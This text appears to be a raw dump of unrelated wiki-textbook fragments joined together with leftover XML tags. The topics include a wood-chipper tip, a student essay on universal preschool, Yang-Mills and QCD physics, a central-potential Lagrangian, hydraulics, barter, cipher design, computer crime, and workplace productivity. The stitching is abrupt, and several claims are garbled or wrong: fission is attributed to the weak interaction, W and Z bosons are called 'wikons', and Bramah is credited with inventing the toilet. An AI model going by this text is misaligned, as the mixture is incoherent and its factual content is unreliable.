If the infeed chute is too full with small branches and jams, use a long branch to try to pull the small branches through, or if necessary use a plastic [[../Grain Scoop/]] or similar tool that is too large to fit into the actual chipper, and is plastic or wood just in case it does touch the blades or rollers.

==Introduction==

This book will eventually cover a large number of topics in the field of electrical communications. The reader will also require a knowledge of Time and Frequency Domain representations, which is covered in-depth in the [[Signals and Systems]] book. This book will, by necessity, touch on a number of different areas of study, and as such is more than just a text for aspiring Electrical Engineers. This book will discuss topics of analog communication schemes, computer programming, network architectures, information infrastructures, communications circuit analysis, and many other topics. It is a large book, and varied, but it should be useful to any person interested in learning about an existing communication scheme, or in building their own. Where previous Electrical Engineering books were grounded in theory (notably the [[Signals and Systems]] book), this book will contain a lot of information on current standards, and actual implementations. It will discuss how current networks and current transmission schemes work, and may even include information for the intrepid engineer to create their own versions of each.

''This book is still in an early stage of development. Many topics do not yet have pages, and many of the current pages are stubs. Any help would be greatly appreciated.''

      <text xml:space="preserve">'''Universal Preschool''' 

By Theresa Ritter  

=='''Introduction'''==

Do children need an early start if they are to succeed in school?  Should any child be left behind because they don’t have the means to pay for a good education? And should all children have equal chance to get ready for kindergarten?  Studies prove that learning is indeed a lifelong journey and the earlier our children get a start, the better for them in the long run. So what can be done, and who should foot the bill? An ongoing argument or debate is voluntary universal early learning programs available to all 4 year-olds regardless of their disability, social status, and economic status.  So what exactly is universal preschool?   What are the pros and cons and who is it best suited for?

=='''The plight for universal preschool'''==

First of all, I would like to reflect on the work of renowned researcher, David Weikart, who conducted a 40 year study on the effects of high-quality preschool programs for children living in poverty.  Weikhart made dramatic changes in the education of those economically impoverished to gain personal, academic, social and economic success.  This study gained notoriety as the “High/Scope Perry Preschool Study,” and began in the 1960’s. Weikart’s study  proves that “with highly skilled teachers working with students three hours a day, five days a week and weekly visits to their homes, their IQ scores climbed dramatically compared to no-program groups” (High/ Scope Resource, 2006/07. 
 
What the study unveiled, was that due to early childhood intervention these students would prove to be more likely to graduate high school, stay out of trouble, less likely be arrested or to go to prison. They would also be more likely go to college, get better paying jobs, be better parents and be less likely to be on welfare, have children out of wedlock, and would in essence benefit society with less crime and violence.  “Even though since they're way in the future, you discount them, those benefits outweigh the costs under pretty much any scenario you can think of,&quot; says Clive Belfield, an economics professor at Queens College at the City University of New York. The return can be as high as $12 for $1 invested, he says, although it's lower - $1.50 to $3 - for his analyses of universal state programs” (Paulson, 2006).

&quot;Preschool is a vital part to a child's future success&quot; &lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;




=='''Illinois Paves the Way; Oklahoma follows suit'''==
Illinois states that universal preschool is the answer to keeping people off the streets and out of prison, and that it seems to be the fix-all for academic and social failure. Illinois sets the lead in the “push” for universal preschool for 3 year olds.  Don Owens talks about how well developed their preschools are in Illinois.  “If you look at pre-K as a national movement, it's continuing to move across the country, and we think California is indicative of that,&quot; says Don Owens, a spokesperson for Pre-K Now, an early childhood- education advocacy group (Paulson, 2006).   Paulson states that by the time children enter kindergarten, many of them are already around eighteen months behind.  She also states that if placing children in preschool at 3 and 4 years of age will keep them off the streets and graduate high school, which in itself is a strong reason to look at funding universal preschools in Illinois.  
In an article written by Davis L. Kirk; you’re doing fine Oklahoma! the writer states, “Oklahoma's pre-K rules are as stringent as any in the nation. There can be no more than 10 students for each teacher, 20 children and two teachers in a classroom. Teachers must have a bachelor's degree and be certified in early-childhood education.”  Kirk adds that “preschool teachers earn as much as higher math teachers because of their college education; all thanks to a generation’s worth of hard work deciphering what works and what does not” (Kirk, 2004).  Kirk shows that Tulsa’s pre-K program has positive effects on cognitive and language test scores.

=='''Governor Schwarzenegger signs legislation supporting universal preschool in California'''==

In September of 2006, “after  a 3-2 margin where California voters rejected Proposition 82 the previous June, which would have taxed the state's wealthy to pay for pre-kindergarten programs open to all students, Governor Arnold Schwarzenegger signed legislation to expand preschool at California’s lower achievement schools,” (Report on Literacy Programs , 2006)   Schwarzenegger promised to help close the achievement gap by expanding preschool programs throughout California, and says “Preschool gives our kids the strong foundation they need to be successful in school and in life. This proposal will ensure more than 12,000 additional children receive high-quality preschool education” (Report on Literacy Programs, 2006).

While  Gov. Arnold Schwarzenegger has said he is “open to additional preschool spending, including a $50 million increase for direct services in early childhood and another $50 million for facilities.” Still, anti-tax groups and some existing private pre-schools, including Montessori schools, opposed the initiative and mounted a large advertising campaign against it.  Those against the program questioned whether the program would suit the rich preschoolers, and doubted it would do anything to better the pre-k-12 system in California.

=='''Gains in success short lived'''==

Studies assert that any success gained by preschool is, in fact, short-lived.  “While young children who participate in preschool may show temporary literacy improvement in the early academic years of elementary school, by the 3rd or 4th grade there is no marked improvement or advantage, and in fact, there is a steady decline” (Wisniewski,  2007).  Hope/Perry study report to the contrary.  They report academic again may fade by 3rd or 4th grade, but participants of his study “achieved greater success in social and economic life then their counterparts” (High/scope resource, 2006/07).   
Regardless, many voices have lashed out, criticizing the push for universal preschool; their views are quite contrary to that of the Perry Study,  and they argue that  it is the parent’s job to nurture and education their own children in their own time, and in their own way.  They also portray that not all children need be “institutionalized” in public preschools, that only the disadvantaged or the poor really need it, and that there truly is no real gain in placing children so young in state run schools. 
 
=='''Who will foot the cost?'''==

In a journal article, written by Wilson Greene, the writer argues that “universal preschool is a costly but worthy goal. He outlines the benefits of universal preschool for all children, for students with handicaps, and for children from poor backgrounds. He then dismisses arguments against universal preschool and concludes that federal and state governments should collectively implement universal preschool” (Green, 2006).

Research states universal preschool will, in fact, benefit society by keeping the underemployed and undereducated off the streets, in school, out of jail, and working.   These same preschoolers will in essence being paying their debts back to society by staying out of trouble, working hard for a living, becoming upstanding citizens who will work hard pay taxes.  Maybe not as much as the wealthy who will “foot the bill,” but they will pay their portion eventually.

=='''Essay Question'''==
'''What concerns do you have about universal preschool?''' 
    
Answer: In a letter written by Tricia Shore, “Preschool for All,” published at LewRockwell.com,” she undoubtedly hates the idea of universal preschool.  Ms. Shore’s exact words on the subject are: “Young children need their mommy and daddy. The security that comes from a young child’s being around his or her parents all day is much better incentive to learn than giving the child to change agents teachers who take the child with ten other young humans on a leash and walk them to the library; the teacher will be lucky to remember a child’s name in ten years.”  Gosh, that is harsh! I wonder if Ms. Shore has ever had place her own children in preschool to have the opportunity to learn social skills, to be creative, to hear exciting stories, build towers or dinosaurs out of legos, create beautiful paintings for their mommy on Mother’s Day, share a birthday cake with school friends, or just mingle with kids their own age?  If she has she would know that there is much more to preschool than lugging kids around on leashes. 
While I agree that children can be, and are, nurtured by heir own parents who are quite capable of setting firm foundations within their own children’s lives, many simply do not have the incentive, the desire, nor the time to expose their children to the things that preschool can. 
Being in the school system myself, I have witnessed first hand how many children are falling between the cracks because of LACK of parental involvement or support in their children’s social, academic and emotional development.  Shore also complains, “I could go on and on, of course, about how strange it is to force money away from those who have more, to give to those who have less. Those individuals who are making over $400,000 or the couples who are making over $800,000 will pay for this &quot;free&quot; preschool. But that's okay. They're rich. What's that thing about forced wealth redistribution? My publicly schooled mind just doesn't seem to remember.” Sarcastic as it seems, she is quite right; the rich will pay, but in the long run, will they?

The QCD (Quantum ChromoDynamics) is the current theoretical framework used to describe the strong interaction (&quot;force&quot;) which is responsible for existence of numerous barion and meson nuclear particles.  Mathematically it is the specific QFT (Quantum Field Theoretic) model from the class of Yang-Mills (YM) &quot;gauge&quot; theories, this one based on the gauge (i.e. localized) symmetry group SU(3).

== Yang-Mills models of fundamental interactions ==

The Yang-Mills theories of gauge interactions describe the matter as one of two types of the substance: 
* Gauge bosons: a bosonic (i.e. having the integer value of the spin) fields (&quot;particles&quot;) that mediate/transfer interactions,
* Source matter: the matter fields that generate and react to the mediating fields. 

The concept of gauge (i.e. localized) symmetries plays the fundamental role in YM theories. The idea is to start with a physical model that has certain global symmetry (here &quot;global&quot; meaning using the same transformation parameters at every point if space-time), and try to see if that physical model can be generalized to support the same symmetry applied with different values at different points in the space-time. Such procedure (called &quot;gauging the symmetry&quot;, i.e. making it local) brings into the model the additional fields (the &quot;gauge&quot; fields) which look as the generalization of the Maxwell's electromagnetic fields. One nontrivial element of this generalization is that if the gauge symmetry is non-Abelian (e.g. the SO(N), SU(N), etc.), the gauge field acquire the self-interaction terms, i.e. the corresponding gauge bosons can generate more of the similar bosons (which does not happen for photons corresponding to the Abelian group U(1)).  

The other modern uses of the Yang-Mills models are 
* The Maxwell's theory of electromagnetic interaction, which is the gauge theory based on the one-parameter U(1) group of symmetries. The source matter here is any charged matter (e.g. electrons), and the gauge matter is the photon.
* The &quot;Standard Model&quot; of electro-weak interaction, which provides currently accurate description of both electromagnetic interaction and of the weak nuclear interaction (causing the CP parity violation and nuclear fision). The source matter here are leptons and quarks with their electromagnetic charges and the weak charges. The gauge matter here is the collection of four bosonic intermediaries: massles photon, and three heavy wikons (one electricaly neutral Z&lt;sup&gt;0&lt;/sup&gt;, and two charged W&lt;sup&gt;+&lt;/sup&gt;, W&lt;sup&gt;-&lt;/sup&gt;).
* The Einstein's General Relativity and its many generalizations are really the double-stacked gauge theory based on the localized group of Poincare symmetries, i.e. 4-dimensional translations R&lt;sup&gt;4&lt;/sup&gt; and the 4-dimensional &quot;rotations&quot; SO(1,3). The source matter here is any matter that has energy (even the massless matter, too). In the most basic model (the original Einstein's General Relativity) the role of the gauge matter is played by the gravitational field whose quantum is massless graviton with spin=2. One additional quirk here is that, since even gravitons have energy, they act as a source of the additional gravitational field, which is mathematically expressed in the very non-linear nature of the Einstein's equations. In more complex variants of the model (Einstein-Cartan theories, etc) the spin of  the all matter is also playing a role of the source of interaction, and there may be extra mediating bosons (in addition to gravitons).

Consider a central potential V(r).  A central potential is where the potential is dependent only on the field point's distance from the origin; in other words, the potential is isotropic.

The Lagrangian of the system can be written as

&lt;math&gt; \mathcal{L} = \frac{1}{2} m\dot{\vec{x}}^{2} - V(r)&lt;/math&gt;

Since the potential is spherically symmetry, it makes sense to write the Lagrangian in spherical coordinates.

&lt;math&gt; 
\dot{\vec{x}}^{2} = \left(\frac{d}{dt}\left(r \sin\phi \sin\theta, r \cos\phi \sin\theta, r \cos\theta\right)\right)^{2}
&lt;/math&gt;

It can then be worked out that:

&lt;math&gt;
\dot{\vec{x}}^{2} = \dot{r}^{2}+r^{2}\dot{\theta}^{2}+r^{2}\dot{\phi}^{2}\sin^{2} \theta
&lt;/math&gt;

Hence the equation for the Lagrangian is

&lt;math&gt;
\mathcal{L} = \frac{1}{2} m\left(\dot{r}^{2}+r^{2}\dot{\theta}^{2}+r^{2}\dot{\phi}^{2}\sin^{2} \theta\right) - V(r)
&lt;/math&gt;

One can then extract three laws of motion from the Lagrangian using the Euler-Lagrange formula

&lt;math&gt;
\frac{d}{dt}\left(\frac{\partial\mathcal{L}}{\partial\dot{r}}\right) - \frac{\partial\mathcal{L}}{\partial r} = 0
\Rightarrow \frac{d}{dt}\left(m\dot{r}\right) - \left(mr\dot{\theta}^{2} + mr\dot{\phi}^{2}\sin^{2}\theta - \frac{\partial V}{\partial r}\right) = 0
\Rightarrow m\frac{d^{2}r}{dt^{2}} = mr\dot{\theta}^{2} + mr\dot{\phi}^{2}\sin^{2}\theta - \frac{\partial V}{\partial r}
&lt;/math&gt;

This looks messy, but when we look at the Euler-Lagrange relation for &lt;math&gt;\phi&lt;/math&gt;, we have

&lt;math&gt;
\frac{d}{dt}\left(mr^{2}\dot{\phi}\sin^{2}\theta\right) = 0
&lt;/math&gt;

Hence &lt;math&gt;mr^{2}\dot{\phi}\sin^{2}\theta&lt;/math&gt; is a constant throughout the motion.

==Who invented it ?==
Joseph Bramah invented it. He also invented the toilet and a printer that numbered bank bills.

==How does it get power? ==

Hydraulics can receive power from many sources.  The most common is a mechanical pump driven by some type of motor.  The motor provides pressure to the fluid in the hydraulic system.

==How does it work?==
A hydraulic system is when a liquid is in a tube, and it is pushed, and the liquid is moved and presses something. For instance, when you are in a car and press the brake pedal, the pedal pushes a liquid called &quot;brake fluid&quot; through a tube where it presses against the brake discs, stopping the car.

The most common method of hydraulic usage is to have a cylinder that contains an internal rod.  The rod is connected to a pusher plate.  As fluid flows behind the pusher plate, the rod is pushed outwards.  The brakes in a car push the brake pads down when fluid is applied.  The hydraulic cylinders in a backhoe push the bucket outwards.

In order to reverse the process, some cylinders have active returns.  Pressure is released on the front of the plate and pressure is applied to the opposite side to make the rod move inwards.

==How dangerous is it?==
Hydraulics can be extremely dangerous because of the high powers involved.

==What does it do?==
It allows heavy loads to be controlled with accuracy.

==How does it affect you?==
When your car is being fixed, a hydraulic jack may be used to lift the car. Forklift trucks and diggers are also often operated by hydraulics.

==How does it vary?==
==How has it changed the world?==
Hydraulics, since its invention is being used in many machines, systems. Like cars, cranes, automobile industries etc.

'''Barter''' is a type of trade that doesn't use any medium of exchange, in which goods or services are exchanged for other goods and/or services. It can be bilateral or multilateral as trade. 

Barter and money have different means of balancing an economic exchange. Barter is used in societies where no monetary system exists. When there is one, it is also used, especially in economies suffering from a very unstable currency (as when hyperinflation hits).

== Transaction issues ==
Barter is possible when coincidence of wants of economic actors enables an exchange cycle between their bids. Before any transaction can be undertaken, each party must be able to supply something another party desires.  

– Some communities develop a system of intermediaries who can store, trade, and warehouse commodities, but who may suffer economic risk. 

– Others develop a system with a virtual value unit (&quot;barter dollars,&quot; for example) to measure and balance exchanges, very similar to a monetary system.

– Multilateral barter is more complex to settle but allows trades that would not be possible with bilateral barter. This complexity can be reduced by ''openbarter'' software.

– On the west coast of the United States the [http://www.geocities.com/theskillspool/index.html Beyond Barter] organization extends the concept to a system based on free sharing of services. Although there's no attempt to balance contributions in individual transactions, controls ensure that members are not overburdened.

== History of barter ==

To organize production and to distribute goods and services among their populations, many pre-capitalist or pre-market economies relied on tradition, top-down command, or community democracy instead of market exchange organised using barter. Relations of reciprocity and/or redistribution substituted for market exchange. Trade and barter were primarily reserved for trade between communities or countries. It is also used when the monetary system failed to measure the economic value of goods.

Barter becomes more and more difficult as people become dispossessed of the means of production of widely-needed goods. For example, if money were to be severely devalued in the United States, most people would have little of value to trade for food (since the farmer can only use so many cars, etc..)

It is used on important transactions between firms or countries to exchange economic values, when monetary constraints are too expensive for the economic actors. 

A well-known example of multilateral trade is the triangular trade. 

Money used to be considered as simpler for small trades; but use of the Web has changed that perception, especially in respect to Swapping.

== In finance ==
In finance, the word &quot;barter&quot; is used when corporations trade with each other using non-money or &quot;near-money&quot; financial assets, such as U.S. Treasury bills.

== Swapping ==
Swapping is the increasingly prevalent informal bartering system in which participants in Internet communities trade items of comparable value on a trust basis.

While swapping is an excellent way to find and obtain items that are inexpensive, it relies upon honesty. A dishonest participant might arrange a swap, and then never complete their end of the transaction, thus getting something for nothing. This practice is called ''swaplifting'',{{Fact|date=February 2007}} a pun on ''shoplifting''. The victim's recourse is often limited to shunning the swaplifter, or taking him to small claims court.

== Misuses of the word &quot;barter&quot; ==
As of 2007, it is popular (especially on UK daytime television) to use the word &quot;barter&quot; in place of &quot;haggle&quot;.{{Fact|date=February 2007}} ''To Buy Or Not To Buy'' uses the word in one of their catchphrases: &quot;Will you barter or scarper?&quot; It is commonly understood that the guests on the show will be paying solely with money and not, for example, offering them part exchange on their A reg Ford Cortina.</text>

      <text xml:space="preserve">Good ciphers often attempt to have the following traits.

== Kerckhoffs's principle ==

A cryptosystem should be secure even if everything about the system, except the key, is public knowledge.

In the words of Claude Shannon, &quot;The enemy knows the system.&quot; (Shannon's maxim).

{{todo|
Say something about &quot;security through obscurity&quot; here.
Perhaps also something about Kerckhoff's other 5 principles.
}}

==Diffusion==

Having good diffusion means that making a small change in the plain text should ideally cause as much as possible of cipher text to have a fifty percent possibility of change.

For example a Caesar cipher has almost no diffusion while a block cypher may contain lots of it.

==Confusion==

For good confusion the relationship between the cypher text and the plain text should be as complex as possible.

      <text xml:space="preserve">==Computer crime==

Computer crime generally refers to criminal activity where a computer or network is the tool, target, or place of a crime. These categories are not exclusive and many activities can be characterized as falling in one or more category. Additionally, although the terms computer crime or cybercrime are more properly restricted to describing criminal activity in which the computer or network is a necessary part of the crime, these terms are also sometimes used to include traditional crimes, such as fraud, theft, blackmail, forgery, and embezzlement, in which computers or networks are used to facilitate the illicit activity.

Computer crime can broadly be defined as criminal activity involving the information technology infrastructure, including illegal access (unauthorized access), illegal interception (by technical means of non-public transmissions of computer data to, from or within a computer system), data interference (unauthorized damaging, deletion, deterioration, alteration or suppression of computer data), systems interference (interfering with the functioning of a computer system by inputting, transmitting, damaging, deleting, deteriorating, altering or suppressing computer data), misuse of devices, forgery (ID theft), and electronic fraud.

*Hardware
Theft of hardware has increased from warehouses and manufacturing facilities due to the growing demand for high-tech products such as microprocessors, computer memory, microcomputers/PCs, Laptop/notebook, palmtop, hard disk drivers and cellular phone that are valuable, compact and easy to transport. For example, a suitcase of microprocessors is worth more than an equivalent volume of cocaine.

Approximately, 4 percent of the hardware theft accounted for over 60 percent of total company losses. While the average high-tech hardware theft is probably in the low thousands of dollars, it is the high-value thefts that dominate overall company losses. Hardware theft has created different levels of cost. In addition of the direct cost of replacing stolen equipment from manufacturers, there are other indirect costs. (The Economic Costs and Implications of High-Technology Hardware Theft by James N Dertouzos)

== Copyright infringement ==
*Software
Software license and copyright infringement can be defined as the unauthorized use or illegal copying of computer software. This can take many forms such as commercial counterfeiting, deliberate and unauthorized copying by dealers, unlicensed copying and use by &quot;end users&quot; and plagiarism by competitors. http://foldoc.org?software+theft

*Music/Movies
There are four main categories of music/movie copyright infringement and they are, making a copy of live performance (bootlegging), making copies of the product, counterfeiting which is essentially the same but involves duplication of both the music product and of its packaging.

*plagiarism
Claiming authorship (creation) of another person's creations (normally writing).

*Art
By posting a work of art to the internet, an artist becomes ultimately vulnerable. The internet is too convenient; any user has complete freedom to publicize content worldwide. This has proven to be something that should be cherished and treated with care, yet feared in anyone’s eyes – let alone the artists. After all, the unfortunate, inevitable truth remains: as long as people are able to add to the internet, someone can find a way to take from the internet.

Online infringement of art copyrigh (along with selling stolen physical art online, unlicensed replication) has been a topic since perhaps the beginning of the internet. The disastrous examples are nearly endless: Stolen artwork being sold on eBay, printing a downloaded piece and selling it for a profit, other users posting a downloaded image and claiming it as their own (plagiarism); from something as shocking as a Facebook family photo being plagiarized and turned into an advertisement on a billboard…


Although there have been many attempts to counterattack these misfortunes, technology is advancing as we know it. When a cure is discovered, another disease is found, so to speak. For a spell, watermarking became popular and was able to prevent most attacks, but as the media grows ever-strong and graphics manipulation tools become more and more powerful, watermarking is but one lock that can be undone. Turning off the Right Click was another myth that was quickly put to rest by those who were able to get behind the coding of a webpage and retrieve the image from there. Some users believe that by use of Flash or Java applets, one is able to hide their image from even the code-saavy’s eye. However, that is another myth.

==Credit fraud==
The internet allows many different types of invasions into personal information, and use of information with little consequences. Through the internet stolen credit cards are easily utilized without any check into if the user is the true owner of the card. When using credit cards over the internet, some tips to help avoid credit fraud are:

 - never respond to emails requesting personal information
 - never respond to requests for verification (phishing)
 - never provide personal information to an unsecure site

As well, people must beware to ensure that no outside parties are able to obtain the credit card number, to avoid such a situation:

 - sign credit cards as soon as you receive them
 - shred all applications for credit cards
 - only carry cards that you absolutely need
 - if you move notify the credit company of the change of address
 - shred anything with a written credit card number
 - Immediately cancel any stolen or lost cards

With these precautionary measure the improper use of your credit card should hopefully be avoided. If for some reason fraudulent charges still occur report them immediately to the credit company as to avoid any future fraud.

==Identity Theft==

In conjunction with credit fraud, identity theft could be enhanced by the amount of information an individual lends to the internet. With many different forums for individuals to post opinions and information of themselves that they think will only be of interest to friends and family could potentially become information that another stranger could use to steal your identity. It is important to put only information that anyone and everyone is allowed to see because on the internet everyone is potentially able to see it. Private information should only be offered on secure and trustworthy sites and different passwords should be used respectively.

== '''Software Piracy''' == 

Software piracy is the illegal copying, distribution and use of software. When a commercial software package is purchased, an end user license agreement (EULA) is included to protect that software program from copyright infringement. Typically, the license states that you can install the original copy of the software you bought on one computer and that you can make a backup copy in case the original is lost or damaged. You agree to the licensing terms and conditions when you open the software package, when you open the envelope that contains the software disks or when you install the software. 
Types of software piracy include:
•	Softlifting: Borrowing and installing a copy of a software application from a colleague. 
•	Client-Server Overuse: Installing more copies of the software than you have licenses for. 
•	Hard Disk Loading: Installing and selling unauthorized copies of software on refurbished or new computers. 
•	Counterfeiting: Duplicating and selling copyrighted programs. 
•	Online piracy: Typically involves downloading illegal software from peer-to-peer network, Internet auction or blog. 
Software piracy applies mainly to full-function commercial software. The time-limited or functions restricted versions of commercial software called shareware are less likely to be pirated since they are freely available. Similarly, freeware (a type of software that is copyrighted but freely distributed at no charge) also offers little incentive for piracy.


=='''Digital Counterfeiting'''==

[[File:New five dollar bill.jpg|100px|thumb|This image may need to be re-sized per the Counterfeit Detection Act of 1992]]

The availability of high quality, full-color imaging products such as scanners, color printers, and color copiers has made digital counterfeiting creating counterfeit copies of items such as currency and Social Security cards, driver licenses, passports, visas, using computers and other types of digital equipment easier and less costly than in the recent past. With digital counterfeiting, the bill is either color copied or it is scanned into a computer and then printed. Counterfeiting is illegal in the United States. Counterfeiting of U.S. currency and other documents is a growing problem in United States and in other countries. The Secret Service has seen an increase in counterfeiting among high school and college students for using exam papers before the final test. To prevent the counterfeiting of U.S. currency, the Treasury Department releases new currency designs every 7 to 10 years. These new designs such as for example,  new $5 bill released in 2008 contain features such as micro printing, watermarks and a security thread that make the new currency much more difficult to duplicate than older currency. Due to the watermarks and security thread are embedded in the paper, counterfeiters are unable to duplicate those features when creating counterfeit bills either from scratch or by bleaching the ink out of existing lower-denomination bills and reprinting them with high denominations. Counterfeit copies of bills using the new designs are easy to detect just by holding them up to the light and looking for the proper watermark or security thread. This is attributed primarily to the ease of creating counterfeit bills- although not necessarily high quality counterfeit bills using digital technology. The paper used with real U.S. bills is very expensive and cannot legally be made by paper mills for any other purpose and because U.S. bills contain a number of other characteristics that are difficult to reproduce accurately. The majority of counterfeit money made by amateurs is easily detectable. Prevention measures for the counterfeiting of other types of documents such as checks, identification cards including RFID tags, digital watermarks, and other difficult to reproduce content. Educating consumers about fake products differs from the authentic products is a vital sign in the ongoing battle against counterfeiting.

      <text xml:space="preserve">==Misuse of technology== 

The big problem about technology misuses can be summarized in two words: culture and education. Some people aren't sufficiently cultured to use technology properly as a tool because they use it as an easy way solution or as a fashionable trends. Also, these people do not have education to use it correctly.

Because of hundreds of services that technology offers, there are many techniques to harm persons and waste time. People use their time to harm others even though they know that it is not good. For example, people manufactures use it as weapons to destroy others instead of improving themselves.

People are actually concerned about misuse and abuse of technology. Society states that internet uses lead to intimidation or threat to people as well as allowing easy piracy by providing the infrastructure to illegal music or software downloads and plagiarism. Educational institutions are worried about students' development in their classes due to misuses of technology. For instance, learners are using cellphones, playing games, and surfing on some pornographic web sites and other non suitable sites during class. Some students even start using cellphones at the age of ten. This isn't a bad thing because many parents are both working and have to leave their children with a babysitter, so they need a way to communicate with their children. Nowadays, children not only want to have cellphones, but also prefer to have the latest version of it. If children do not have it, they might feel ashamed with their friends and prefer to leave their old-fashioned cellphone at home. Moreover, many late model cellphones have built-in camera and some people use it to record pictures or videos that may damage others reputation. Because of these, some people say and think that the technology is responsible and it is not good for society. However, people have to understand that this is happening because of technology misuse. As a tool, technology do not do anything to threaten the society, it is the misuse of it that threatens society. It is humans that uses a technology that threatens society, the fault is at the user of the technology, not the technology itself.

Digital counterfeiting is a great example of the misuse if technology. Digital counterfeiting is the illegal act of creating copies of items such as currency, legal documents, and credit cards with the use of computers, printers, and scanners. With the high resolution and extremely good color quality of the printers offered today, individuals have increased the opportunity that’s higher than ever to create digital counterfeiting. The US Secret Service estimates that more than 60% of all counterfeited money today is created digitally. With the advancement in technology of printers, scanners, and computers, the increase of digital counterfeiting is at an all time high.

==Information Overload== 

In the workplace Today’s workers are in an epidemic where work life-balance has begun to diminish due to an increased work day for many reasons but one of the most glaring reason is workers are bombarded with information due to such an advancement in technology throughout the last century (http://www.itworldcanada.com/Pages/Docbase/ViewArticle.aspx?id=idgml-48e5eb31-580c-4a40-a63a-4ed949983e8c&amp;view=Preview). Increased progress in the field of information technology has increased the speed, quantity and how you communicate with co-workers and clients (http://www.itworldcanada.com/Pages/Docbase/ViewArticle.aspx?id=idgml-48e5eb31-580c-4a40-a63a-4ed949983e8c&amp;view=Preview). Email and fax have dramatically increased the speed and frequency of communication in the workplace. Email allows you to communicate without actually having a physical conversation. Email also allows you to send and share documents over long distances. Fax and scanning machines are also pieces of technology that have vastly improved the communication process. Many professionals also carry tools like cell phones, blackberries and laptop computers. Essentially an employee can be reached at all times of day. This 24/7 attitude has become somewhat of a standard in the corporate world especially once you reach the higher ranks in an organization. The separation from home and work becomes blurred (http://www.itworldcanada.com/Pages/Docbase/ViewArticle.aspx?id=idgml-48e5eb31-580c-4a40-a63a-4ed949983e8c&amp;view=Preview). Advancements in technology have also contributed to people working from home which now allows people to take their work home from there again loosing their work life balance. Although many of the increased technology has greatly improved how we do business it has also caused excess stress, strain and burnout for the average worker. When you are overloaded with anything, in this case information you tend to forget tasks, fail to prioritize therefore your tasks will be completed with less care and detail. This information overload is causing many workplace illnesses and health problems. Information overload has become part of our daily work life and it has become a standard of work however with increased health concerns we are now seeing today we need to take this topic seriously and try to think of ways to get back to a balanced healthy way of life that can handle all of the information we need to do our best at our occupation.

==Workplace Crime: Productivity Issues &quot;&quot;Workplace Crimes &amp; Company Employees&quot;&quot;==

a) A Look at Productivity over Time

Most prevalent among workplace productivity issues appear to be such things as fussing and theft of time and services. In fact, Michael Kanell states that “growth in the amount Americans produced each working hour last quarter fell to zero” (http://www.ajc.com/business/content/business/stories/2006/11/24/1124bizproductivity.html, Retrieved Nov 27, 2006). So what has happened in the workplace to result in such dismal returns.

Historically and following primary activities of traditional society, secondary activities of manufacturing became front and center in the work world and each new tool or invention was implemented to boost production. Productivity would eventually level off under the newly adopted process (sometimes decreasing with other factors such as breakdowns), then encounter another leap forward with the next change, upgrade or invention. These productivity increases were evidenced from World War II until the more sluggish progress of the 1970s (http://www.ajc.com/business/content/business/stories/2006/11/24/1124bizproductivity.html, Retrieved Nov 27, 2006).

Tertiary industries proliferated in the more modern society. Production had become highly automated and service industries became the name of the game in the business world. But how could productivity be measured in the service sector? Workers may not directly produce physical “items”, so productivity and efficiency are more difficult to determine. It became necessary to find alternative means of measuring productivity. Economic returns are one piece of evidence for productivity and one indicator of how good one’s economy is can be found in its productivity – a somewhat circular argument!

Well, one step further and one is greeted by the world of quaternary activity – the information age – the age of computers and their connection to the world. While one has the potential to measure how many haircuts a service industry employee can do in a day’s work, it is substantially harder to measure productivity, at the least, and efficiencies, even more so, in this new age. More and more enterprises have become involved in assembling, processing and transmitting information. But how can this be measured or valuated? I guess there’s money to be made somewhere for some people in this information dependant time – Bill Gates is but one example. Therefore, if there’s economic return, there must be productivity somewhere in the system if previous statements are true (Abler, R., J.S. Adams &amp; P. Gould, 1971, Spatial Organization: The Geographer’s View of the World, Englewood Cliffs: New Jersey, pp. 306-309; Rubenstein, J.M. 1994. The Cultural Landscape: An Introduction to Human Geography. 8th ed. Upper Saddle River, NJ: Pearson Prentice Hall, pp. 300-304).

If one cannot directly measure productivity and efficiency in the workplace, then, the workplace must depend upon countering any inefficiencies and loss of productivity. At first glance, there’s a lot of work done – or appears to be – but what about output? According to Kathryn Kobe of Economic Consulting Services in Washington, “ … you are seeing … an output slowdown, which also leads to a productivity slowdown …” (http://www.ajc.com/business/content/business/stories/2006/11/24/1124bizproductivity.html, Retrieved Nov 27, 2006).

If these output and productivity slowdowns are happening, what is causing them? What workplace problems exist to create this situation or is this simply part of the normal growth-stability-next leap forward cycles that existed even in earlier periods (e.g., manufacturing sector’s history)?

b) Workplace Problems &amp; the Computer: A Waste of Time?

In my father’s words, “computers are going to be the downfall of society!” (Personal Communication, no dates) Well, maybe there is some truth to his statement after all. As we delve deeper into the workplace and its nuances, it is possible to get a clearer picture of what is truly being accomplished and what problems exist – many associated with the computer and the employee’s use of them.

I have coined the phase “counterproductive productivity” to refer to the huge amount of time wasted in the workplace associated with computer use. So much productive time is lost – even in work-related computer activities, let alone the losses chalked up to what might be referred to as “theft of computer time” by employees in non-work-related computer use. Each of these problems will be examined here.

i) No Crime, Just Lost Time …?

Williams and Sawyer (Using Information Technology: A Practical Introduction to Computers &amp; Communications, 7th ed., Montreal: McGraw-Hill, p. 477) have referred to goofing off in the workplace as “undertime” and further noted that some amount of this downtime was tolerated in the name of workplace morale. However, with the advent of the computer and especially with their superior level of interconnectivity worldwide, computer use has resulted in “new ways to slack off.”

How long do you have to wait for that program to load and run? Did you have to spend time, energy and money (ie, yours or your employers) in software training, upgrading or problem solving? How much time are you spending awaiting some technical support? Did you count the volume of junk e-mail and spam in your in-box? How much time did you devote to reading or deleting these? Did you have to sort out disk storage issues or re-organize your computer desktop today? Then, system maintenance interruptions – how much time did you lose waiting for the problem to be fixed and for the system to be returned to operation? Oh, just 10 minutes yesterday and another half hour today. Well, it all adds up!

One news article stated that “… well over half of all emails received in the EU are unsolicited, despite the increased efforts of anti-spam and spyware to block out messages … “ and another report tallied it up and “… found that spam cost US$51.1 billion worldwide in lost productivity and higher computing bills last year.” Furthermore, Postini, an email security company, noted that “… worldwide, nine out of 10 emails are junk …” and in one month alone, “… more than 7 billion junk emails were sent worldwide … “ (http://www.ctv.ca/servlet/ArticleNews/story/CTVNews/20061127/eu_email_061127/20061127?hub=TopStories Retrieved Nov 27, 2006).

